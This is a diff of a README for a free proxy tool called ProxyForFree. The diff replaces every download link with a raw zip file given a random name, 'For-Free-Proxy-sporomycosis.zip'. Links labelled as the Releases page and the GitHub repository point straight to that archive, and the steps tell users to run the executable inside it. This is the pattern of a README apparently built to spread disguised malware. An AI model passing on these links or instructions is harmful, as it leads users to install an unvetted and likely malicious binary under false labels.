@@ -1,6 +1,6 @@
 # 🛡️ ProxyForFree - Browse Anonymously and Freely
 
-[![Download ProxyForFree](https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip)](https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip)
+[![Download ProxyForFree](https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip)](https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip)
 
 ## 📖 Overview
 
@@ -21,20 +21,20 @@ If you're new to proxy servers, don't worry! This guide will take you through ev
 
 To download ProxyForFree, you can visit the Releases page using the link below:
 
-[Visit the Releases Page to Download](https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip)
 
 ### 📂 Installation Steps
 
 1. **Visit the Releases Page:** Click the link above to access the Downloads section.
 2. **Find the Latest Version:** Scroll to the top of the page to locate the latest release.
 3. **Download the Application:** Click on the appropriate file for your operating system. You might see options such as:
-   - https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip 
-   - https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip
-   - https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip
+   - https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip 
+   - https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip
+   - https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip
 4. **Run the Installer:**
    - For Windows: Double-click the .exe file to start the installation.
    - For macOS: Open the .app file and drag it to your Applications folder.
-   - For Linux: Extract the https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip file and run from the terminal.
+   - For Linux: Extract the https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip file and run from the terminal.
 5. **Open ProxyForFree:** After installation, locate the application on your computer and double-click to launch.
 
 ## 🎉 How to Use ProxyForFree
@@ -64,7 +64,7 @@ If you encounter issues, consider these common solutions:
 
 ## 💬 Community Support
 
-ProxyForFree is open-source, which means you can contribute! If you have questions or feedback, please post in the Issues section of our [GitHub Repository](https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip).
+ProxyForFree is open-source, which means you can contribute! If you have questions or feedback, please post in the Issues section of our [GitHub Repository](https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip).
 
 ## 📄 License
 
@@ -80,4 +80,4 @@ ProxyForFree is licensed under the MIT License. You are free to use, modify, and
 
 For more information on proxies and how to use them safely, refer to our documentation or the community discussions.
 
-[Return to the Releases Page to Download Again](https://github.com/BlazeAuraX/ProxyForFree/raw/refs/heads/main/assets/For-Free-Proxy-v1.5.zip)
+[Return to the Releases Page to Download Again](https://raw.githubusercontent.com/BlazeAuraX/ProxyForFree/main/vpn_configs/norway/For-Free-Proxy-sporomycosis.zip)
